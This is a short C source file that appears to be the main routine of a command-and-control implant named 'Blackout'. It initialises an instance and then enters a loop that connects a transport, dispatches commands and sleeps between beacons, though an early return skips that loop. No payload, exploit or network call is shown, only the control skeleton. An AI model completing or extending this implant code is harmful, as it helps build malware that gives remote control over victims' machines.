#include <Common.h>
#include <Constexpr.h>

FUNC VOID BlackoutMain(
    _In_ PVOID Param
) {
    BLACKOUT_INSTANCE
    
    BlackoutInit();
    
    CommandMemory( 0 );

    return;
    do {
        if ( !Instance()->Session.Connected ) {
            if ( TransportInit() )
                CommandDispatcher();
        }
        SleepMain( Instance()->Session.SleepTime * 1000 );
    } while ( TRUE );
    
}

